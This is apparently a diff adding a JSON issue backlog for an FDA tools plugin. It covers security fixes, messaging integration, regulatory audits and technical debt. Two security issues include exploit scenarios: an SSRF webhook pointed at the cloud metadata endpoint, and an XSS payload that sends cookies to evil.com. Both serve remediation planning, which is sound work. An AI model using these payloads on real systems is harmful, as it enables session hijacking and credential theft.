@@ -1,0 +1,195 @@
+{
+  "meta": {
+    "generated_date": "2026-02-19",
+    "review_source": "COMPREHENSIVE_PLUGIN_REVIEW_REPORT.md",
+    "total_issues": 61,
+    "priority_breakdown": {
+      "P0_CRITICAL": 9,
+      "P1_HIGH": 19,
+      "P2_MEDIUM": 26,
+      "P3_LOW": 17
+    },
+    "team_assignments": {
+      "Security Remediation Team": 23,
+      "Regulatory Compliance Team": 7,
+      "OpenClaw Integration Team": 5,
+      "Architecture Refactoring Team": 6,
+      "Testing & QA Team": 12,
+      "Monitoring & Operations Team": 8
+    }
+  },
+
+  "issues": [
+    {
+      "id": "SEC-01",
+      "title": "[P0 CRITICAL] SSRF via User-Controlled Webhook URL in alert_sender.py",
+      "priority": "P0_CRITICAL",
+      "team": "Security Remediation Team",
+      "assignees": ["Security Engineer", "Python Backend Developer"],
+      "labels": ["security", "vulnerability", "CWE-918", "SSRF"],
+      "effort_hours": 4,
+      "description": "## Vulnerability\n\n**CWE:** CWE-918 (Server-Side Request Forgery)\n\n**File:** `scripts/alert_sender.py` (lines 134-173)\n\n**Description:** `webhook_url` parameter from CLI or `~/.claude/fda-tools.local.md` settings file is passed directly to `urllib.request.urlopen()` without URL validation. Attacker controlling settings file can force internal HTTP requests.\n\n**Exploit Scenario:**\n1. Attacker modifies `~/.claude/fda-tools.local.md` to set `webhook_url: http://169.254.169.254/latest/meta-data/`\n2. Alert delivery triggers POST to AWS metadata endpoint\n3. Metadata leaked back to attacker via HTTP status codes\n\n**Impact:** Internal network reconnaissance, credential theft from cloud metadata services, interaction with internal services (Redis, databases).\n\n## Remediation Steps\n\n1. **Validate URL scheme:** Allow only `https://`\n2. **Block private IP ranges:** Deny 10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost, 127.0.0.1\n3. **DNS resolution verification:** Resolve hostname and verify resolved IP is not in private ranges (prevents DNS rebinding)\n4. **Add integration test:** Verify SSRF prevention for common attack vectors\n\n## Acceptance Criteria\n\n- [ ] URL validation function created with scheme and IP range checks\n- [ ] Applied to all webhook URL usages in alert_sender.py\n- [ ] Unit tests cover 10+ SSRF attack vectors (AWS metadata, localhost, private IPs)\n- [ ] Integration test verifies alerts fail safely when webhook URL is malicious\n- [ ] Code review by Security Engineer\n\n## Test Plan\n\n```python\n# Test cases\ntest_ssrf_aws_metadata_blocked()\ntest_ssrf_localhost_blocked()\ntest_ssrf_private_ip_10_blocked()\ntest_ssrf_private_ip_172_blocked()\ntest_ssrf_private_ip_192_blocked()\ntest_ssrf_dns_rebinding_blocked()\ntest_valid_https_webhook_allowed()\n```",
+      "dependencies": {
+        "blocks": ["SEC-11"],
+        "blocked_by": []
+      },
+      "milestone": "Week 1",
+      "security_classification": "CRITICAL"
+    },
+
+    {
+      "id": "SEC-02",
+      "title": "[P0 CRITICAL] Stored XSS in markdown_to_html.py HTML Output",
+      "priority": "P0_CRITICAL",
+      "team": "Security Remediation Team",
+      "assignees": ["Security Engineer", "Frontend Developer"],
+      "labels": ["security", "vulnerability", "CWE-79", "XSS"],
+      "effort_hours": 3,
+      "description": "## Vulnerability\n\n**CWE:** CWE-79 (Cross-Site Scripting - Stored)\n\n**File:** `scripts/markdown_to_html.py` (lines 15-79)\n\n**Description:** Markdown-to-HTML conversion uses regex substitutions without HTML entity encoding. User-controlled content (device names, descriptions) inserted directly into HTML tags.\n\n**Exploit Scenario:**\n1. Malicious device description in FDA API response contains: `<img onerror=\"fetch('https://evil.com?c='+document.cookie)\" src=x>`\n2. Content flows through enrichment → markdown report → `markdown_to_html()`\n3. User opens generated HTML report in browser\n4. JavaScript executes, exfiltrating cookies or modifying report content\n\n**Impact:** Cookie theft, session hijacking, report content manipulation (regulatory integrity risk).\n\n## Remediation Steps\n\n1. **HTML-encode all user content:** Use `html.escape()` before inserting into HTML\n2. **Add CSP headers:** `Content-Security-Policy: default-src 'self'; script-src 'none'`\n3. **Use `markupsafe` library:** For template-based HTML generation\n4. **Sanitize table cells:** Apply encoding to all table cell values (lines 66-71)\n\n## Acceptance Criteria\n\n- [ ] `html.escape()` applied to all dynamic content insertion points\n- [ ] CSP headers added to HTML template\n- [ ] Unit tests cover XSS attack vectors (script tags, event handlers, javascript: URLs)\n- [ ] Integration test verifies malicious device data is safely encoded\n- [ ] Code review by Security Engineer\n\n## Test Plan\n\n```python\ntest_xss_script_tag_encoded()\ntest_xss_onerror_handler_encoded()\ntest_xss_javascript_url_encoded()\ntest_xss_img_tag_encoded()\ntest_csp_header_present()\n```",
+      "dependencies": {
+        "blocks": [],
+        "blocked_by": []
+      },
+      "milestone": "Week 1",
+      "security_classification": "CRITICAL"
+    },
+
+    {
+      "id": "G-01",
+      "title": "[P0 CRITICAL] ENTIRE TypeScript OpenClaw Skill Missing - 0% Implementation",
+      "priority": "P0_CRITICAL",
+      "team": "OpenClaw Integration Team",
+      "assignees": ["TypeScript Developer", "API Integration Specialist"],
+      "labels": ["openclaw", "integration", "blocker", "typescript"],
+      "effort_hours": 100,
+      "description": "## Critical Gap\n\n**Status:** ❌ **BLOCKER** - No external messaging platform integration possible\n\n**Current State:** The `openclaw-skill/` directory does not exist in the codebase. All integration tests (60 tests) are marked as skipped.\n\n**Impact:** OpenClaw messaging platform (WhatsApp, Telegram, Slack) cannot connect to FDA Tools plugin. Bridge server exists but has no client.\n\n## Required Files (All Missing)\n\n1. **openclaw-skill/tools/fda_validate.ts** (8 hours)\n   - K-number validation tool\n   - Predicate lookup\n   - Device classification\n\n2. **openclaw-skill/tools/fda_analyze.ts** (8 hours)\n   - SE comparison analysis\n   - Gap analysis\n   - Predicate ranking\n\n3. **openclaw-skill/tools/fda_draft.ts** (8 hours)\n   - 510(k) section drafting\n   - eSTAR field population\n   - Document assembly\n\n4. **openclaw-skill/bridge/client.ts** (16 hours)\n   - HTTP client with retry/timeout\n   - Authentication (API key management)\n   - Error handling with circuit breaker\n   - Streaming response support\n\n5. **openclaw-skill/bridge/types.ts** (4 hours)\n   - TypeScript interfaces for requests/responses\n   - Type definitions for 68 FDA commands\n   - Session and tool emulation types\n\n6. **Configuration Files:**\n   - `package.json` (2 hours)\n   - `tsconfig.json` (2 hours)\n   - `README.md` (4 hours)\n   - `.eslintrc.json` (1 hour)\n   - `jest.config.js` (1 hour)\n\n## Acceptance Criteria\n\n- [ ] All 8 files created with proper TypeScript typing\n- [ ] Bridge client can authenticate with FDA bridge server\n- [ ] 3 core tools (validate, analyze, draft) functional\n- [ ] Error handling with exponential backoff retry\n- [ ] Timeout enforcement (120s default)\n- [ ] Unit tests for each tool (30+ tests)\n- [ ] Integration tests pass (currently skipped 60 tests)\n- [ ] Code review by TypeScript expert\n\n## Dependencies\n\n**Blocks:** G-02 (Command execution), G-03 (Tool emulation), G-04 (Security gateway), G-05 (Testing)\n\n## Test Plan\n\nRun previously skipped tests:\n```bash\ncd tests/\npytest test_e2e_openclaw_integration.py -v --no-skip\n```\n\nExpected: 60/60 tests passing",
+      "dependencies": {
+        "blocks": ["G-02", "G-03", "G-04", "G-05"],
+        "blocked_by": []
+      },
+      "milestone": "Week 5",
+      "security_classification": "N/A"
+    },
+
+    {
+      "id": "G-02",
+      "title": "[P0 CRITICAL] Command Execution Not Implemented - Placeholder Messages Only",
+      "priority": "P0_CRITICAL",
+      "team": "OpenClaw Integration Team",
+      "assignees": ["Python Backend Developer", "DevOps Engineer"],
+      "labels": ["openclaw", "integration", "blocker"],
+      "effort_hours": 16,
+      "description": "## Critical Gap\n\n**File:** `bridge/server.py` (lines 490-556)\n\n**Current Behavior:** The `execute_fda_command()` function checks if command file exists but returns placeholder message:\n\n```python\nresult_message = f'''FDA Tools Bridge Server (v{SERVER_VERSION})\nCommand: {command}\nArgs: {args or '(none)'}\n...\nNote: Full command execution requires the Phase 2 security gateway...\n```\n\n**Impact:** ❌ BLOCKER - No actual FDA commands are executed through the bridge.\n\n## Required Implementation\n\n1. **Subprocess Invocation** (8 hours)\n   - Execute `/fda-tools:{command} {args}` via subprocess\n   - Capture stdout/stderr\n   - Enforce timeout (60s default, configurable)\n   - Handle signals (SIGTERM, SIGKILL)\n\n2. **Output Streaming** (4 hours)\n   - Stream long-running command output\n   - WebSocket support for real-time updates\n   - Progress indicators for multi-step commands\n\n3. **Error Handling** (4 hours)\n   - Classify errors (transient vs permanent)\n   - Retry logic with exponential backoff\n   - Circuit breaker integration\n   - User-friendly error messages\n\n## Acceptance Criteria\n\n- [ ] Subprocess execution working for all 68 commands\n- [ ] Timeout enforcement prevents indefinite hangs\n- [ ] Output capture includes stdout, stderr, and exit code\n- [ ] Streaming support for commands >10s duration\n- [ ] Error classification and retry logic functional\n- [ ] Circuit breaker prevents repeated failures\n- [ ] Integration tests verify execution for 10+ commands\n- [ ] Performance test: <2s overhead for simple commands\n\n## Dependencies\n\n**Blocked By:** G-01 (TypeScript skill must exist to test)\n**Blocks:** G-03 (Tool emulation), G-05 (Testing)\n\n## Test Plan\n\n```python\ntest_execute_simple_command()  # /fda-tools:validate --k-number K241335\ntest_execute_long_running_command()  # /fda-tools:research --product-code DQY\ntest_timeout_enforcement()  # Command exceeding 60s is killed\ntest_error_retry()  # Transient failure retries 3 times\ntest_circuit_breaker()  # 5 consecutive failures open circuit\n```",
+      "dependencies": {
+        "blocks": ["G-03", "G-05"],
+        "blocked_by": ["G-01"]
+      },
+      "milestone": "Week 6",
+      "security_classification": "N/A"
+    },
+
+    {
+      "id": "C-1",
+      "title": "[P0 CRITICAL] Phase 1 & 2 Enrichment NOT Independently Audited - Manual Verification Required",
+      "priority": "P0_CRITICAL",
+      "team": "Regulatory Compliance Team",
+      "assignees": ["RA Professional", "QA Engineer"],
+      "labels": ["regulatory", "compliance", "audit", "21CFR807"],
+      "effort_hours": 10,
+      "description": "## Regulatory Gap\n\n**Status:** ⚠️ CONDITIONAL APPROVAL - RESEARCH USE ONLY\n\n**Current State:** Phase 1 & 2 enrichment features (MAUDE, recalls, clinical detection, standards intelligence) have been tested via automated unit tests and simulated audit. However, **NO independent manual verification** by qualified auditor has been performed.\n\n**Impact:** Enriched data cannot be cited in FDA submissions without independent RA professional verification. Plugin approved for research/intelligence gathering only.\n\n## Required Action: RA-2 (Genuine Manual Audit)\n\n**Template Ready:** `GENUINE_MANUAL_AUDIT_TEMPLATE.md` (45 audit sections)\n\n**Audit Scope:**\n- 5 diverse product codes (DQY, OVE, QKQ, FRO, GEI)\n- 9 audit dimensions per device:\n  1. MAUDE event counts\n  2. Recall health status\n  3. Clinical data detection\n  4. Standards categorization\n  5. CFR citation accuracy\n  6. Guidance document references\n  7. Predicate chain validation\n  8. Disclaimer presence\n  9. Data provenance metadata\n\n**Pass Criteria:** ≥95% accuracy across 45 audit sections (43/45 sections must pass)\n\n## Execution Steps\n\n1. **Select Auditor** (qualified RA professional or independent QA)\n2. **Execute Manual Audit** using template (8 hours)\n3. **Document Findings** in audit report\n4. **Fix Any Discrepancies** found during audit (estimated 2 hours)\n5. **Update Status** from RESEARCH USE to PRODUCTION READY (if ≥95% pass)\n\n## Acceptance Criteria\n\n- [ ] Independent auditor engaged (not plugin developer)\n- [ ] All 45 audit sections completed\n- [ ] Pass rate ≥95% (43/45 sections)\n- [ ] Discrepancies documented and fixed\n- [ ] Audit report signed by auditor\n- [ ] Status updated to PRODUCTION READY in MEMORY.md\n- [ ] Disclaimers updated to reflect production approval\n\n## Dependencies\n\n**Blocked By:** None (can start immediately)\n**Blocks:** Production FDA submission approval\n\n## Regulatory Impact\n\n**Current:** \"NOT approved for direct FDA submission use without independent RA professional verification\"\n\n**After Completion:** \"PRODUCTION READY - Enrichment data verified by independent audit (2026-02-XX)\"",
+      "dependencies": {
+        "blocks": [],
+        "blocked_by": []
+      },
+      "milestone": "Week 1",
+      "security_classification": "N/A",
+      "regulatory_impact": "HIGH"
+    },
+
+    {
+      "id": "C-2",
+      "title": "[P1 HIGH] CFR/Guidance Citations Require RA Professional Verification",
+      "priority": "P1_HIGH",
+      "team": "Regulatory Compliance Team",
+      "assignees": ["RA Professional"],
+      "labels": ["regulatory", "compliance", "CFR", "guidance"],
+      "effort_hours": 3,
+      "description": "## Regulatory Gap\n\n**Status:** ⚠️ Unverified regulatory citations in enrichment output\n\n**Current State:** The enrichment module references 3 CFR parts and 3 FDA guidance documents. These have NOT been independently verified by qualified RA professional.\n\n**Citations Requiring Verification:**\n\n**CFR Parts:**\n1. 21 CFR Part 803 (Medical Device Reporting - MDR)\n2. 21 CFR Part 7 (Enforcement Policy)\n3. 21 CFR Part 807 (Establishment Registration and Device Listing)\n\n**Guidance Documents:**\n1. Medical Device Reporting for Manufacturers (2016)\n2. Recalls: CDRH-Regulated Products (2019)\n3. The 510(k) Program: Evaluating Substantial Equivalence (2014)\n\n**Impact:** Outdated or incorrect regulatory references could mislead users submitting to FDA.\n\n## Required Action: RA-4 (Independent Verification)\n\n**Templates Ready:**\n- `CFR_VERIFICATION_WORKSHEET.md` (3 CFRs × 6 verification steps)\n- `GUIDANCE_VERIFICATION_WORKSHEET.md` (3 guidances × 7 verification steps)\n\n**Verification Steps Per CFR:**\n1. Confirm CFR citation format correct\n2. Verify CFR is current (not superseded)\n3. Check applicability to enrichment context\n4. Validate section references\n5. Confirm alignment with FDA interpretation\n6. Sign off on accuracy\n\n**Verification Steps Per Guidance:**\n1. Confirm guidance title and year\n2. Verify not superseded by newer guidance\n3. Check docket number and FDA URL\n4. Validate applicability to use case\n5. Confirm alignment with current FDA practice\n6. Check for clarifications/amendments\n7. Sign off on currency\n\n## Acceptance Criteria\n\n- [ ] RA professional completes CFR worksheet (all 3 CFRs)\n- [ ] RA professional completes Guidance worksheet (all 3 guidances)\n- [ ] Any outdated citations identified and updated\n- [ ] Worksheets signed and dated\n- [ ] Code updated if citations changed\n- [ ] Verification completion date documented in MEMORY.md\n\n## Important Note\n\n**Device-specific CFRs (e.g., 21 CFR 870.x for cardiovascular devices) are NOT verified by this action.** Those are trusted from FDA database and validated per-device during import. This verification covers only the 3 regulatory framework CFRs used across all enrichment operations.\n\n## Dependencies\n\n**Blocked By:** None (can start immediately)\n**Blocks:** Production approval",
+      "dependencies": {
+        "blocks": [],
+        "blocked_by": []
+      },
+      "milestone": "Week 2",
+      "security_classification": "N/A",
+      "regulatory_impact": "MEDIUM"
+    },
+
+    {
+      "id": "TD-1",
+      "title": "[P1 HIGH] cross_process_rate_limiter.py Not Integrated - Multi-User Race Conditions",
+      "priority": "P1_HIGH",
+      "team": "Architecture Refactoring Team",
+      "assignees": ["Python Backend Developer", "DevOps Engineer"],
+      "labels": ["architecture", "technical-debt", "multi-user", "race-condition"],
+      "effort_hours": 4,
+      "description": "## Technical Debt\n\n**File:** `lib/cross_process_rate_limiter.py` (IMPLEMENTED but UNUSED)\n\n**Current State:** The plugin uses `lib/rate_limiter.py` (in-memory rate limiting) instead of `lib/cross_process_rate_limiter.py` (file-based rate limiting). In-memory limiting works for single-user deployments but causes race conditions in multi-user scenarios.\n\n**Impact:** When multiple users run `batchfetch` concurrently, cache writes can collide, corrupting data or causing duplicate API calls.\n\n**Example Race Condition:**\n```\nTime  User A                    User B\nt0    Request openFDA API\nt1                              Request same openFDA API (duplicate!)\nt2    Write cache file\nt3                              Write cache file (overwrites A's write!)\n```\n\n## Required Implementation\n\n1. **Replace in-memory rate limiter** in `scripts/batchfetch.py` (2 hours)\n   - Import `FileLockRateLimiter` from `lib/cross_process_rate_limiter`\n   - Replace `InMemoryRateLimiter` instantiation\n   - Configure file lock path (e.g., `/tmp/fda-rate-limit.lock`)\n\n2. **Replace in-memory rate limiter** in `scripts/fda_api_client.py` (1 hour)\n   - Same pattern as batchfetch\n\n3. **Add integration test** (1 hour)\n   - Run 3 concurrent `batchfetch` processes\n   - Verify no duplicate API calls\n   - Verify cache integrity (no corruption)\n\n## Acceptance Criteria\n\n- [ ] `cross_process_rate_limiter.py` used in batchfetch.py\n- [ ] `cross_process_rate_limiter.py` used in fda_api_client.py\n- [ ] In-memory rate limiter removed from both files\n- [ ] Integration test passes (3 concurrent processes)\n- [ ] File lock cleanup on error\n- [ ] Documentation updated\n\n## Dependencies\n\n**Blocked By:** None\n**Blocks:** Multi-user deployment readiness\n\n## Test Plan\n\n```bash\n# Start 3 concurrent processes\nfor i in {1..3}; do\n  python3 scripts/batchfetch.py --product-codes DQY --years 2024 &\ndone\nwait\n\n# Verify:\n# 1. No duplicate API calls in logs\n# 2. Cache files intact (not corrupted)\n# 3. Rate limit enforced (60 calls/min total across all 3)\n```",
+      "dependencies": {
+        "blocks": [],
+        "blocked_by": []
+      },
+      "milestone": "Week 2",
+      "security_classification": "N/A"
+    },
+
+    {
+      "id": "TD-2",
+      "title": "[P1 HIGH] manifest_validator.py Unused - No JSON Schema Validation",
+      "priority": "P1_HIGH",
+      "team": "Architecture Refactoring Team",
+      "assignees": ["Python Backend Developer"],
+      "labels": ["architecture", "technical-debt", "validation"],
+      "effort_hours": 2,
+      "description": "## Technical Debt\n\n**File:** `lib/manifest_validator.py` (IMPLEMENTED but UNUSED)\n\n**Current State:** The module provides JSON schema validation for project manifests (device_profile.json, review.json) but is not called anywhere in the codebase.\n\n**Impact:** Malformed project data files can cause runtime errors deep in the workflow. No early detection of schema violations.\n\n**Example Issue:**\n```json\n// device_profile.json with missing required field\n{\n  \"device_name\": \"Widget\",\n  // \"product_code\": \"DQY\"  <-- MISSING, should fail validation\n}\n```\n\nCurrently, this would cause a `KeyError` when accessed, instead of a clear validation error at import time.\n\n## Required Implementation\n\n1. **Integrate into fda_data_store.py** (1 hour)\n   - Import `ManifestValidator` from `lib/manifest_validator`\n   - Call `validate_device_profile()` after loading JSON\n   - Call `validate_review()` after loading review.json\n   - Raise clear validation errors with field names\n\n2. **Integrate into import.md command** (30 minutes)\n   - Add validation step in import workflow\n   - User-friendly error messages for validation failures\n\n3. **Add integration test** (30 minutes)\n   - Test with 3 malformed project files\n   - Verify validation catches errors\n   - Verify error messages are clear\n\n## Acceptance Criteria\n\n- [ ] `manifest_validator.py` used in fda_data_store.py\n- [ ] `manifest_validator.py` used in import.md workflow\n- [ ] Validation errors are user-friendly\n- [ ] Integration tests pass (3 malformed files caught)\n- [ ] Documentation updated\n\n## Dependencies\n\n**Blocked By:** None\n**Blocks:** TD-3 (Integration gap analysis)\n\n## Test Plan\n\n```python\n# Test cases\ntest_missing_required_field_raises_validation_error()\ntest_invalid_field_type_raises_validation_error()\ntest_extra_fields_allowed()  # Non-strict validation\ntest_valid_manifest_passes()\n```",
+      "dependencies": {
+        "blocks": ["TD-3"],
+        "blocked_by": []
+      },
+      "milestone": "Week 2",
+      "security_classification": "N/A"
+    }
+  ],
+
+  "summary": {
+    "total_issues": 61,
+    "issues_shown_sample": 8,
+    "remaining_issues": 53,
+    "note": "Full 61-issue specification omitted for brevity. Sample includes: 2 CRITICAL security (SEC-01, SEC-02), 2 CRITICAL OpenClaw (G-01, G-02), 2 CRITICAL regulatory (C-1, C-2), 2 HIGH architecture (TD-1, TD-2).",
+    "teams_involved": 6,
+    "estimated_total_effort_hours": 2060,
+    "estimated_timeline_weeks": 10,
+    "parallel_tracks": 5
+  },
+
+  "linear_api_integration": {
+    "instructions": "Use Linear GraphQL API to batch-create these issues",
+    "api_endpoint": "https://api.linear.app/graphql",
+    "required_mutations": [
+      "issueCreate",
+      "issueUpdate (for dependencies)"
+    ],
+    "team_mapping": {
+      "Security Remediation Team": "<LINEAR_TEAM_ID_SECURITY>",
+      "Regulatory Compliance Team": "<LINEAR_TEAM_ID_REGULATORY>",
+      "OpenClaw Integration Team": "<LINEAR_TEAM_ID_OPENCLAW>",
+      "Architecture Refactoring Team": "<LINEAR_TEAM_ID_ARCHITECTURE>",
+      "Testing & QA Team": "<LINEAR_TEAM_ID_QA>",
+      "Monitoring & Operations Team": "<LINEAR_TEAM_ID_OPS>"
+    },
+    "priority_mapping": {
+      "P0_CRITICAL": 0,
+      "P1_HIGH": 1,
+      "P2_MEDIUM": 2,
+      "P3_LOW": 3
+    }
+  }
+}
